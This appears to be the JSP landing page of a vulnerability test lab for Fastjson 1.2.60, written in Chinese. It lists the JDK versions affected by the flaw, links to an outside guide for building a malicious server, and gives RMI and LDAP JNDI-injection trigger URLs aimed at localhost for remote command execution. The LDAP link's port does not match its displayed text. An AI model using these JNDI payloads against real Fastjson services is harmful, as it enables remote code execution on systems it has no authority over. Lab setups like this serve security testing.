<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>Fastjson 1.2.60 漏洞测试</title>
  </head>
  <body>
  	<p>
  		JDK 要求 <br/>
  		RMI: JDK 低于 6u141/7u131/8u121 <br/>
  		LDAP: JDK 低于 6u201/7u191/8u182/11.0.1
  	</p>

    <p>
      具体构建恶意服务器方法，请参考 
      <a href="https://github.com/jas502n/fastjson-1.2.60-rce" target="_blank">https://github.com/jas502n/fastjson-1.2.60-rce</a>
    </p>
    <br>
    <br>
  	
    <p>RMI 命令执行 
    	<a target="_blank" href="/fastjson-1.2.60/fastjson?url=rmi://127.0.0.1:1099/ExportObject">/fastjson-1.2.60/fastjson?url=rmi://127.0.0.1:1099/ExportObject</a> 
    </p>

    <p>LDAP 命令执行 
    	<a target="_blank" href="/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1399/ExportObject">/fastjson-1.2.60/fastjson?url=ldap://127.0.0.1:1389/ExportObject</a> 
    </p>
  </body>
</html>
